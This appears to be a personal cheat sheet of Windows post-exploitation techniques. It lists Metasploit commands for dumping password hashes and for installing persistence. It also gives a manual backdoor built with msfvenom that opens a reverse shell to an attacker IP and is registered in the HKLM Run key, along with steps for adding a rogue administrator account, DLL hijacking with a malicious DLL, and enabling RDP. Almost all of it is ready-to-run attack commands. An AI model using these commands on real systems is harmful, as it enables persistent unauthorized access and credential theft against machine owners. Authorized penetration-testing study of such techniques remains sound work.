# ------------------------------- start post exploitation ------------------------------- # 
    ==> Quick view: is crucial because we might need to interact with the hacked system repeatedly.
    Therefore, in order to achieve persistent access.

    - password hash
        - pass the hash
        - crack the hash
    - backdoor
    - new users
    - dll hijacking
    - RDP service
    - VNC service
    - telnet service
    - ssh service
# -------------------------------   end post exploitation ------------------------------- # 

# ------------------------------- start post exploitation techniques ------------------------------- # 
    # ---------- |start password hash| ---------- #
        # ---------- |Tools| ---------- #
            - metasploit: hashdump 

        # ---------- |metasploit: hashdump| ---------- #
            meterpreter> run hashdump
        
        # ---------- | start password the hash| ---------- #
            resource: windows-auth-attack
        # ---------- |   end password the hash| ---------- #
        
        # ---------- | start crack the hash| ---------- #
            resource: windows-auth-attack
        # ---------- |   end crack the hash| ---------- #
    # ---------- |  end password hash| ---------- #

    # ---------- |start backdoor| ---------- #
        # ---------- |Tools| ---------- #
            - metasploit: presistence
            - manually

        # ---------- |metasploit: presistence| ---------- #
            meterpreter> run presistence -h
                ==> explanation: show options
                ==> options:
                            -A: starts the handler on attacker machine.
                            -X: start the agent at boot.
                            - i <x>: conenction attempt each x seconds
                            -p <attacker_port>: the port for the connect back.
                            -r <attacker_ip>: the ip for the connect back. 
            meterpreter> run presistence -A -X -i 10 -p <attacker_port> -r <attacker_ip>
                ==> explanation: steps in details:
                                1- creating the payload.
                                2- uploading the backdoor file.
                                3- executing the backdoor.
                                4- add the entry in the windows registry
            
        # ---------- |manually| ---------- #
            ==> Quick View: create presistence access manually through backdoor.
            # ---------- |Tools| ---------- #
                - payload generator
                    - msfvenom
                    - veil 
                    - meterpreter shell (SYSTEM privilege)
                    - registry entry

                1st: msfvenom -p windows/x64/meterpreter/reverse_tcp rhost=<attacker_ip> lport=<attacker_port> -f exe > reverse.exe
                2nd: meterpreter> upload reverse.exe
                3rd: meterpreter> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\reverse.exe" -v rev_name
    # ---------- |  end backdoor| ---------- #

    # ---------- |start new users| ---------- #
        # ---------- |Tools| ---------- #
            - meterpreter: incognito
            - net

        # ---------- |net| ---------- #
            net user <uesrname> <psasword> /add
                ==> explanation: add new user.
            net localgroup "Administrators" <username> /add
                ==> explanation: append user for specific group.
    # ---------- |  end new users| ---------- #
    
    # ---------- |start dll hijacking| ---------- #
        ==> Quick View: when a program is launched, the dll search order in mosr cases is as follows:
            1- the directory from which the application launched.
            2- the C:\Windows\System32 directory
            3- the 16-bit windows system directory (i.e C:\windows\system)
            4- the current directory at the time of execution.
            5- any directories specified by the %PATH% environment variable.

        # ---------- |Tools| ---------- #
            - process monitor
            - payload creator:
                - msfvenom
                - viel
        # ---------- |process monitor| ---------- #
            ==> Quick View: we can easily identify such application and DLL's we can use
            for this of vulnearbility.
            
            1st: create procmon filter for a specific executable we'd like to investigate and create
            filter for result "NAME NOT FOUND".
            
            2nd: use msfvenom or viel to create dll malicious file or inject in the original one,
            identify cases where the application is looking for a DLL in a dirctory we can write 
            to or modify.

            3rd: restart the service, re-launch the application or wait for system to be rebooted.
    # ---------- |  end dll hijacking| ---------- #

    # ---------- |start RDP service| ---------- #
        # ---------- |Tools| ---------- #
            - net
            - wmic
            - metasploit: service_manager
                        : post/windows/gather/enum_services
            - metasploit: getgui
            - xfreerdp

        # ---------- |check RDP status| ---------- #
            # ---------- |net| ---------- #
                1st: net start
                    ==> explanation: check enabled services.
                
            # ---------- |wmic| ---------- #
                1st: wmic service where 'Caption like "Remote%" and started=true' get caption
                    ==> explanation: check RDP is enabled or not.
                
            # ---------- |metasploit: service_manager| ---------- #
                1st: meterpreter> run service_manager -l
                    ==> explanation: check enabled services.
            
            # ---------- |metasploit: post/windows/gather/enum_services| ---------- #
                1st: meterpreter> run post/windows/gather/enum_services
                    ==> explanation: check enabled services.
        
        # ---------- |enable RDP| ---------- #
            2nd: meterpreter> run getgui -e
                ==> explanation: enable RDP only.

        # ---------- |connect to rdp| ---------- #
            3rd: xfreerdp /u:<username> /d:<domain> /p:<password> /v:<target_ip>
                ==> explanation: use xfreerdp to connect through rdp
    # ---------- |  end RDP service| ---------- #


# -------------------------------   end post exploitation techniques ------------------------------- # 